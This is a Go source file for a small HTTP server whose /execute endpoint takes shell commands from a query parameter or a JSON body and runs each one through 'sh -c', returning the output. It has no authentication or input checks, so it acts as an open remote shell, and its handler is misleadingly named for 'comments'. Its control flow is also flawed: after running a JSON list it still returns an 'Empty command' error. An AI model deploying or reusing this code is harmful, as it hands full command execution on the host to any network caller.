package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
)

type CommandList struct {
	Commands []string `json:"commands"`
}

func main() {
	http.HandleFunc("/execute", handleComment)
	http.ListenAndServe(":8080", nil)
}

func handleComment(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	command := r.URL.Query().Get("command")

	if command == "" {
		var commandList CommandList

		err := json.NewDecoder(r.Body).Decode(&commandList)

		fmt.Fprintf(w, "%s", commandList)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		fmt.Printf("\nReceived list of comments: %+v\n", commandList)

		for _, command := range commandList.Commands {
			fmt.Println("Running command:", command)

			cmd := exec.Command("sh", "-c", command)
			output, err := cmd.Output()

			if err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}

			fmt.Printf("\nCommand executed!")
			fmt.Fprintf(w, "%s", output)
		}
	}

	if command == "" {
		http.Error(w, "Empty command", http.StatusBadRequest)
		return
	}

	fmt.Printf("\nReceived command: %+v\n", command)
	fmt.Printf("\nExecuting command: %+v\n", command)

	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.Output()

	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	fmt.Printf("\nCommand executed!")

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "%s", output)
}
